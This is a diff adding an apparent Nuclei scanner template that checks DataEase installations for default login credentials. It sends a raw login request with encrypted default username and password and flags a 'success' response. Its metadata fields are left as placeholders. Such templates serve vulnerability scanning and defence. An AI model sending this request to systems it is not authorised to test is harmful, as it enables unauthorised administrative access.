@@ -1,0 +1,32 @@
+id: DataEase-default-login
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 219
+        Accept: application/json, text/plain, */*
+        LINK-PWD-TOKEN: null
+        Accept-Language: zh-CN
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        Content-Type: application/json
+        Origin: http://{{Hostname}}
+        Referer: http://{{Hostname}}/
+        Accept-Encoding: gzip, deflate, br
+        Cookie: request-time-out=10; sysUiInfo={%22ui.logo%22:{%22paramKey%22:%22ui.logo%22%2C%22paramValue%22:null%2C%22type%22:%22file%22%2C%22sort%22:1%2C%22file%22:null%2C%22fileName%22:null}%2C%22ui.loginLogo%22:{%22paramKey%22:%22ui.loginLogo%22%2C%22paramValue%22:null%2C%22type%22:%22file%22%2C%22sort%22:2%2C%22file%22:null%2C%22fileName%22:null}%2C%22ui.loginImage%22:{%22paramKey%22:%22ui.loginImage%22%2C%22paramValue%22:null%2C%22type%22:%22file%22%2C%22sort%22:3%2C%22file%22:null%2C%22fileName%22:null}%2C%22ui.loginTitle%22:{%22paramKey%22:%22ui.loginTitle%22%2C%22paramValue%22:%22%22%2C%22type%22:%22text%22%2C%22sort%22:4%2C%22file%22:null%2C%22fileName%22:null}%2C%22ui.title%22:{%22paramKey%22:%22ui.title%22%2C%22paramValue%22:%22%22%2C%22type%22:%22text%22%2C%22sort%22:5%2C%22file%22:null%2C%22fileName%22:null}%2C%22ui.favicon%22:{%22paramKey%22:%22ui.favicon%22%2C%22paramValue%22:null%2C%22type%22:%22file%22%2C%22sort%22:6%2C%22file%22:null%2C%22fileName%22:null}%2C%22ui.themeStr%22:{%22paramKey%22:%22ui.themeStr%22%2C%22paramValue%22:%22light%22%2C%22type%22:%22text%22%2C%22sort%22:12%2C%22file%22:null%2C%22fileName%22:null}%2C%22ui.openHomePage%22:{%22paramKey%22:%22ui.openHomePage%22%2C%22paramValue%22:%22true%22%2C%22type%22:%22boolean%22%2C%22sort%22:13%2C%22file%22:null%2C%22fileName%22:null}%2C%22ui.mobileBG%22:{%22paramKey%22:%22ui.mobileBG%22%2C%22paramValue%22:null%2C%22type%22:%22file%22%2C%22sort%22:14%2C%22file%22:null%2C%22fileName%22:null}%2C%22ui.helpLink%22:{%22paramKey%22:%22ui.helpLink%22%2C%22paramValue%22:null%2C%22type%22:%22text%22%2C%22sort%22:15%2C%22file%22:null%2C%22fileName%22:null}%2C%22ui.homeLink%22:{%22paramKey%22:%22ui.homeLink%22%2C%22paramValue%22:null%2C%22type%22:%22text%22%2C%22sort%22:16%2C%22file%22:null%2C%22fileName%22:null}}
+        Connection: close
+
+        {"username":"kA18C8YnoceeCNIxpORDcVXR9J/8EXf1uYibPLNbdvmBLTgKfG3JV2jwOGmsAnJSBbnXH2WzDyPHNESfHleyYQ==","password":"P/yiGo0GtWIuaLsSPAuyBoYSQ9zDU5/Eg+mWnne+9DgMrjb/m/2f6hcoCKZMoBnaXIJ/aYzQu33/VN/MA9QG4A==","loginType":0}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"success":true'
